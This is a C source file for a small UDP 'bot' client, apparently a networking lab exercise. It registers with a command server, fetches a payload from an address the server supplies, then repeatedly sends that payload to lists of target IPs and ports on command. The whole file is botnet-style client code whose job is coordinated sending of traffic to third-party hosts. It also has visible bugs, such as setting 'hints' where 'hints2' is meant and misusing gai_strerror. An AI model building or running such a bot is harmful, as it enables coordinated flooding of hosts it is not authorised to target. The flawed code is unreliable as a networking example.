#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define MAXLEN 256

int Getaddrinfo(const char *hostname,const char *service,const struct addrinfo *hints,struct addrinfo **result){
	int err;
	if((err=getaddrinfo(hostname,service,hints,result)) != 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

int Socket(int family,int type,int protocol){
	int err;
	if((err=socket(family,type,protocol)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

ssize_t Sendto(int sockfd,void *buff,size_t nbytes,int flags,const struct sockaddr* to,socklen_t addrlen){
	int err;
	if((err=sendto(sockfd,buff,nbytes,flags,to,addrlen)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

ssize_t Recvfrom(int sockfd,void *buff,size_t nbytes,int flags,struct sockaddr *from,socklen_t *fromaddrlen){
	int err;
	if((err=recvfrom(sockfd,buff,nbytes,flags,from,fromaddrlen)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

void substring(char *src,char *dst,int length,int position){
	int c=0;
	while (c < length) {
      *(dst+c) = *(src+c+position-1);
		c++;
	}
	*(dst+c) = '\0';
}  

int main(int argc, char *argv[]) {
	if(argc < 3){
		fprintf(stderr,"Usage: ./bot server_ip server_port\n");
		exit(1);
	}
	
	char *server_ip=argv[argc-2];
	char *server_port=argv[argc-1];
	struct addrinfo hints;
	struct addrinfo *res;
	int mysock;
	char buffer[MAXLEN]="REG\n";
	
	memset(&hints,0,sizeof(hints));
	mysock=Socket(PF_INET,SOCK_DGRAM,0);
	
	hints.ai_family=AF_INET;
	hints.ai_socktype=SOCK_DGRAM;
	Getaddrinfo(server_ip,server_port,&hints,&res);
	
	int size=0;
	for(;buffer[size] != '\0'; ++size);
	size *=sizeof(buffer[0]);
	Sendto(mysock,buffer,size+1,0,res->ai_addr,res->ai_addrlen);
	printf("poslano: %s",buffer);
	
	while(1){
		char MSG[1+20*INET_ADDRSTRLEN+20*22+1];
		int rec=Recvfrom(mysock,MSG,sizeof(MSG),0,res->ai_addr,&(res->ai_addrlen));
		char command=MSG[0];
		char payload[512+1]={'\0'};
		int payrecv=0;
		
		if(command == '0'){
			char IP[INET_ADDRSTRLEN+1];
			substring(MSG,IP,INET_ADDRSTRLEN,2);
			char port[22+1];
			substring(MSG,port,22,1+INET_ADDRSTRLEN+1);
			struct addrinfo hints2;
			struct addrinfo *res2;
			memset(&hints2,0,sizeof(hints2));
			hints.ai_family=AF_INET;
			hints.ai_socktype=SOCK_DGRAM;
			Getaddrinfo(IP,port,&hints2,&res2);
			char buff[MAXLEN]="HELLO";	
					
			Sendto(mysock,buff,6,0,res2->ai_addr,res2->ai_addrlen);
			printf("poslano: %s",buff);
			
			payrecv=Recvfrom(mysock,payload,512+1,0,res2->ai_addr,&(res2->ai_addrlen));
			printf("primljeno: %s",payload);
			freeaddrinfo(res2);
		}
		else{
			int i=0;
			int pairs=(rec-1)/(INET_ADDRSTRLEN+22);
			while(i<15){								
				if(pairs > 0){
					char IP[INET_ADDRSTRLEN+1];
					char port[22+1];
					substring(MSG,IP,INET_ADDRSTRLEN,1+((pairs-1)*INET_ADDRSTRLEN)+((pairs-1)*22)+1);
					substring(MSG,port,22,1+((pairs-1)*INET_ADDRSTRLEN)+((pairs-1)*22)+INET_ADDRSTRLEN+1);
					struct addrinfo hints2;
					struct addrinfo *res2;
					memset(&hints2,0,sizeof(hints2));
					hints.ai_family=AF_INET;
					hints.ai_socktype=SOCK_DGRAM;
					Getaddrinfo(IP,port,&hints2,&res2);
					
					Sendto(mysock,payload,payrecv,0,res2->ai_addr,res2->ai_addrlen);
					pairs--;
					printf("poslano: %s",payload);
					freeaddrinfo(res2);
				}
				sleep(1);
				i++;				
			}
		}
	}	
}
	
